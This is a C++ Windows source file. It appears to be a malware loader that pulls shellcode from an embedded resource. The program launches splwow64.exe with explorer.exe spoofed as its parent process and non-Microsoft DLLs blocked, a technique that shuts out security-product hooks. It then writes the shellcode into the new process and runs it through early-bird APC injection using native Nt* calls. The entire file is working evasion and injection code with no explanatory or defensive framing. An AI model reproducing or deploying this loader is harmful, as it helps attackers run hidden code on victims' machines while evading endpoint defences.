#include "..\public.hpp"
#include <vector>
#include <psapi.h>
#include "ntdll.h"

#pragma comment(lib, "ntdll")

DWORD FindProcessId()
{
    DWORD processId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(snapshot, &processEntry))
        {
            do
            {
                if (_wcsicmp(processEntry.szExeFile, L"explorer.exe") == 0)
                {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }

        CloseHandle(snapshot);
    }

    return processId;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR  lpCmdLine, _In_ int  nCmdShow)
{
	//1.Get shellcode and shellcodesize from Resource by ID
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode == nullptr)
	{
		return 0;
	}

    UNICODE_STRING NtImagePath, CurrentDirectory, CommandLine;
    RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\splwow64.exe");
    RtlInitUnicodeString(&CurrentDirectory, (PWSTR)L"C:\\Windows");
    RtlInitUnicodeString(&CommandLine, (PWSTR)L"\"C:\\Windows\\splwow64.exe\"");

    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
    RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, &CurrentDirectory, &CommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

    PS_CREATE_INFO CreateInfo = { 0 };
    CreateInfo.Size = sizeof(CreateInfo);
    CreateInfo.State = PsCreateInitialState;

    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE) * 3);
    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    AttributeList->Attributes[0].Size = NtImagePath.Length;
    AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, 0, 0, 0, 0);

    CLIENT_ID cid = { (HANDLE)FindProcessId(), NULL };

    HANDLE hParent = NULL;
    NtOpenProcess(&hParent, PROCESS_ALL_ACCESS, &oa, &cid);

    AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
    AttributeList->Attributes[1].Size = sizeof(HANDLE);
    AttributeList->Attributes[1].ValuePtr = hParent;

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

    AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
    AttributeList->Attributes[2].Size = sizeof(DWORD64);
    AttributeList->Attributes[2].ValuePtr = &policy;

    HANDLE hProcess, hThread = NULL;
    NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, &CreateInfo, AttributeList);

    PVOID lpBaseAddress = NULL;
    SIZE_T sDataSize = shellcodeSize;
    NtAllocateVirtualMemory(hProcess, &lpBaseAddress, 0, &sDataSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    //lpBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, sDataSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    NtWriteVirtualMemory(hProcess, lpBaseAddress, (PVOID)shellcode, sDataSize, NULL);
    //WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)shellcode, shellcodeSize, NULL);

    ULONG ulOldProtect = 0;
    NtProtectVirtualMemory(hProcess, &lpBaseAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

    NtQueueApcThread(hThread, (PPS_APC_ROUTINE)lpBaseAddress, NULL, NULL, NULL);
    //QueueUserAPC((PAPCFUNC)lpBaseAddress, hThread, NULL);

    NtResumeThread(hThread, NULL);
    //ResumeThread(hThread);

    CloseHandle(hThread);
	return 0;
}